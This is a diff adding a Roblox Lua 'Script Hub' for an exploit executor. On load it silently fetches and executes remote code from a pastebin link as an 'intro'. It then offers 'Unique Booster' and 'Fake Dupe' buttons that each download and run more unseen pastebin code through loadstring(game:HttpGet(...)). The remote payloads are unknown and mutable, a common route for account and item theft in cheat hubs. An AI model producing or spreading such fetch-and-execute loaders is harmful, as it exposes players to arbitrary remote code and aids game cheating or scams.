@@ -1,0 +1,156 @@
+-- SETTINGS
+local INTRO_TIME = 5      -- fallback wait (seconds) if the intro makes no GUI
+local INTRO_TIMEOUT = 40  -- max seconds to wait for the intro GUI to close
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+
+-- Containers where the intro might put its GUI
+local containers = { Players.LocalPlayer:WaitForChild("PlayerGui") }
+pcall(function() table.insert(containers, CoreGui) end)
+if gethui then pcall(function() table.insert(containers, gethui()) end) end
+
+-- Snapshot existing GUIs before the intro runs
+local before = {}
+for _, c in ipairs(containers) do
+    for _, g in ipairs(c:GetChildren()) do before[g] = true end
+end
+
+-- 1. INTRO
+pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/DBzgFdTC"))()
+end)
+
+-- Wait for the intro to finish
+task.wait(0.5)
+local introGuis = {}
+for _, c in ipairs(containers) do
+    for _, g in ipairs(c:GetChildren()) do
+        if not before[g] and g:IsA("ScreenGui") then
+            table.insert(introGuis, g)
+        end
+    end
+end
+
+if #introGuis > 0 then
+    local t = 0
+    while t < INTRO_TIMEOUT do
+        local alive = false
+        for _, g in ipairs(introGuis) do
+            if g.Parent then alive = true break end
+        end
+        if not alive then break end
+        task.wait(0.25)
+        t += 0.25
+    end
+else
+    task.wait(INTRO_TIME)
+end
+
+-- 2. HUB GUI (appears after the intro)
+local parent = (gethui and gethui()) or Players.LocalPlayer:WaitForChild("PlayerGui")
+local old = parent:FindFirstChild("CombinedHub")
+if old then old:Destroy() end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "CombinedHub"
+gui.ResetOnSpawn = false
+gui.Parent = parent
+
+local FULL_SIZE = UDim2.new(0, 260, 0, 170)
+
+local frame = Instance.new("Frame")
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.Size = UDim2.new(0, 0, 0, 0) -- starts hidden, pops in
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.ClipsDescendants = true
+frame.Parent = gui
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 36)
+title.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+title.BorderSizePixel = 0
+title.Text = "  Script Hub"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 16
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = frame
+Instance.new("UICorner", title).CornerRadius = UDim.new(0, 10)
+
+local close = Instance.new("TextButton")
+close.Size = UDim2.new(0, 28, 0, 28)
+close.Position = UDim2.new(1, -32, 0, 4)
+close.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
+close.Text = "X"
+close.TextColor3 = Color3.fromRGB(255, 255, 255)
+close.Font = Enum.Font.GothamBold
+close.TextSize = 14
+close.Parent = frame
+Instance.new("UICorner", close).CornerRadius = UDim.new(0, 6)
+close.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+local function makeButton(text, yPos, url)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, -30, 0, 45)
+    btn.Position = UDim2.new(0, 15, 0, yPos)
+    btn.BackgroundColor3 = Color3.fromRGB(60, 120, 255)
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 15
+    btn.Parent = frame
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+
+    btn.MouseButton1Click:Connect(function()
+        btn.Text = "Loading..."
+        local ok = pcall(function()
+            loadstring(game:HttpGet(url))()
+        end)
+        btn.Text = ok and (text .. " ✓") or (text .. " ✗ failed")
+        task.wait(2)
+        btn.Text = text
+    end)
+end
+
+makeButton("Unique Booster", 50, "https://pastebin.com/raw/sa12W9ER")
+makeButton("Fake Dupe", 107, "https://pastebin.com/raw/4mtMitJ7")
+
+-- Pop-in animation
+TweenService:Create(frame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+    { Size = FULL_SIZE }):Play()
+
+-- 3. DRAGGING
+local dragging, dragStart, startPos
+title.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+    or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
